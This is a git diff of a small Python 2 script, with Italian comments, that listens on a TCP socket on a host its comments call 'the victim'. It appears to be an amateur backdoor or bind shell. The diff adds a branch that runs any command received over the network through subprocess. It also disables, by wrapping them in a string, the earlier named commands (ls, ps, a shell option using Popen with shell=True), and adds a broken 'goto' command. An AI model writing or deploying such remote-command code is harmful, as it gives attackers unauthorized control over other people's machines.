@@ -17,7 +17,7 @@ import shlex
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print("Socket creata")
 
-HOST = 'xxx.xxx.xxx.xxx'  # IP server (ovvero della vittima)
+HOST = 'localhost'  # IP server (ovvero della vittima)
 PORT = 8888  # Porta da usare
 
 # Collega la socket alla porta e all'host locale
@@ -60,6 +60,13 @@ def ricevi_dati(conn):
 			i -= 1
 			break
 			#print(i)
+
+		else:
+			cmd = dati.strip()
+			subprocess.call([cmd])
+			#os.system(cmd)
+
+		"""
 		elif (dati.strip() == "mostra"):
 			subprocess.call(["ls"])
 
@@ -72,7 +79,10 @@ def ricevi_dati(conn):
 		elif (dati.strip() == "ps"):
 			subprocess.call(["ps"])
 
-
+		elif (dati.strip() == "goto"):
+			destinazione = raw_input("Dove vuoi andare: ")
+			subprocess.call(["cd %s", destinazione])
+		
 		elif (dati.strip() == "shell"):
 			if len(dati.strip()) > 1:
 				proc2 = subprocess.Popen(dati.strip(), shell = True,
@@ -82,6 +92,7 @@ def ricevi_dati(conn):
 				output = proc2.stdout.read() + proc2.stderr.read()
 			else:
 				output = 'args must follow "shell"'
+		"""
 		print("Inviato da:  " + str(var_ip) + " - " + dati)
     conn.close()
 
